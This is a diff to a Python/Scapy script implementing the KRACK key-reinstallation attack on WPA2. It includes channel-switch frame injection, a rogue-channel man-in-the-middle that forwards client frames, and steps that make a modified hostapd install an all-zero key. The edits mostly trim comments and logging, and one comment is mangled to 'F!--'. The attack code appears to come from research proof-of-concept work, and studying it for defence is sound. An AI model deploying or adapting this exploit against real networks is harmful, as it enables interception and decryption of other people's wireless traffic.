@@ -135,7 +135,6 @@ def dot11_get_seqnum(p):
 	return p[Dot11].SC >> 4
 
 def dot11_get_iv(p):
-	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
 	if not p.haslayer(Dot11WEP):
 		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
 		return 0
@@ -207,12 +206,12 @@ def dot11_to_str(p):
 		if p.subtype == 11:      return "RTS"
 		if p.subtype == 13:      return "Ack"
 	elif p.type == 2:
-		if p.haslayer(Dot11WEP):        return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
+		if p.haslayer(Dot11WEP): return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
 		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
 		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
 		if p.haslayer(EAPOL):
 			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
-			elif p.haslayer(EAP):       return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
+			elif p.haslayer(EAP):return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
 			else:                return repr(p)
 	return repr(p)			
 
@@ -220,14 +219,12 @@ def construct_csa(channel, count=1):
 	switch_mode = 1			# STA should not Tx untill switch is completed
 	new_chan_num = channel	# Channel it should switch to
 	switch_count = count	# Immediately make the station switch
-
 	# Contruct the IE
 	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
 	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)
 
 def append_csa(p, channel, count=1):
 	p = p.copy()
-
 	el = p[Dot11Elt]
 	prevel = None
 	while isinstance(el, Dot11Elt):
@@ -235,7 +232,6 @@ def append_csa(p, channel, count=1):
 		el = el.payload
 
 	prevel.payload = construct_csa(channel, count)
-
 	return p
 
 def get_tlv_value(p, typee):
@@ -510,16 +506,12 @@ class KRAckAttack():
 		if client.assocreq is None:
 			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
 			return False
-
 		# 1. Add the client to hostapd
 		self.hostapd_add_sta(client.macaddr)
-
 		# 2. Inform hostapd of the encryption algorithm and options the client uses
 		self.hostapd_rx_mgmt(client.assocreq)
-
 		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
 		self.hostapd_finish_4way(client.macaddr)
-
 		return True
 
 	def handle_to_client_pairwise(self, client, p):
@@ -645,17 +637,11 @@ class KRAckAttack():
 
 			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
 			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
-				print_rx(INFO, "Real channel ", p)
 				if p.addr2 in self.clients: del self.clients[p.addr2]
-
-			# Display all frames sent from a MitM'ed client
-			elif p.addr2 in self.clients:
-				print_rx(INFO, "Real channel ", p)
 
 			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
 				print_rx(INFO, "Real channel ", p)
-
 
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
@@ -678,30 +664,25 @@ class KRAckAttack():
 			# If targeting a specific client, display all frames it sends
 			elif self.clientmac is not None and self.clientmac == p.addr1:
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# For other clients, just display what might be forwarded
-			elif might_forward:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
+			# F!-- or other clients, just display what might be forwarded
+			# elif might_forward:
+			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 
 			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
 				# Unicast frames to clients
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
-
 					# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
 					if self.handle_to_client_pairwise(client, p):
 						pass
-
 					elif self.handle_to_client_groupkey(client, p):
 						pass
-
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
 						self.sock_rogue.send(p)
-
 					else:
 						self.sock_rogue.send(p)
-
 				# Group addressed frames
 				else:
 					self.sock_rogue.send(p)
@@ -722,9 +703,6 @@ class KRAckAttack():
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
 				print_rx(INFO, "Rogue channel", p)
-			# And display all frames sent to a MitM'ed client
-			elif p.addr1 in self.clients:
-				print_rx(INFO, "Rogue channel", p)
 
 		# 2. Handle frames sent TO the AP
 		elif p.addr1 == self.apmac:
@@ -741,7 +719,7 @@ class KRAckAttack():
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
 				will_forward = client.should_forward(p)
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
+				# print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
 				print_rx(INFO, "Rogue channel", p)
